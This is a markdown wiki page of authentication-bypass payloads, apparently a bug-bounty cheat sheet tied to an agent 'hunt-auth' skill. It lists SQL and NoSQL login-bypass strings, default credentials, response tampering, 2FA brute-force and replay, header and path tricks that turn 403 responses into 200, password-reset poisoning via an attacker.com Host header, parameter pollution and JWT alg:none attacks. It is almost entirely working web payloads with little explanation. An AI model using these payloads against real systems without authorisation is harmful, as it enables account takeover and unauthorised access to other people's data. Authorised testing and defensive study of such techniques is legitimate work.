---
title: "Payloads: Authentication Bypass"
type: payloads
tags: [payloads, authentication, bypass, 2fa, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: Authentication Bypass

Login, MFA, and access-control bypass primitives. Routed via the `hunt-auth` skill. See [[authentication-attacks]], [[access-control]]; tokens -> [[jwt-attacks]].

## SQL / NoSQL login bypass
```
admin' --        admin'#        admin'/*        ' or 1=1 --        ') or ('1'='1
{"username":{"$ne":null},"password":{"$ne":null}}      # NoSQL, see [[nosql]]
```

## Default / weak creds (check first)
```
admin:admin  admin:password  root:root  admin:<blank>  guest:guest
# product defaults -> wiki/cheatsheets/default-credentials.md
```

## Response / logic manipulation
```
{"success":false}  -> {"success":true}        # tamper the auth response
HTTP 302 -> read the body of the "denied" 200; force 200 with X-Forwarded-* 
remove the MFA step / replay the pre-MFA session cookie
2FA: brute 000000-999999 (no rate limit); reuse one OTP; null/empty code; race the verify
```

## Authorization bypass (403/401 -> 200)
```
/admin            -> /admin/   /admin/.   /admin..;/   /Admin   /%2e/admin   //admin
X-Original-URL: /admin     X-Rewrite-URL: /admin     X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1   X-Forwarded-Host: localhost   Referer: https://target/admin
verb tamper: GET->POST/PUT/HEAD/TRACE/PATCH ;  /api/v1->/api/v2
```

## Password reset / takeover (see [[account-takeover]])
```
Host: attacker.com         X-Forwarded-Host: attacker.com      # reset poisoning
email=victim@x.com&email=attacker@x.com                        # param pollution
token: guessable/sequential/no-expiry/returned-in-JSON
```

## OAuth / JWT / SAML
```
JWT: alg:none ; weak HS256 secret crack ; kid path/SQLi ; jku/x5u SSRF   (see [[jwt]])
OAuth redirect_uri + SAML XSW -> [[oauth-saml]]
```

## Real-world
`X-Original-URL`/`X-Custom-IP-Authorization` ACL bypass, response-flag tampering, OTP no-rate-limit, and reset poisoning are recurring high-bounty ATOs.
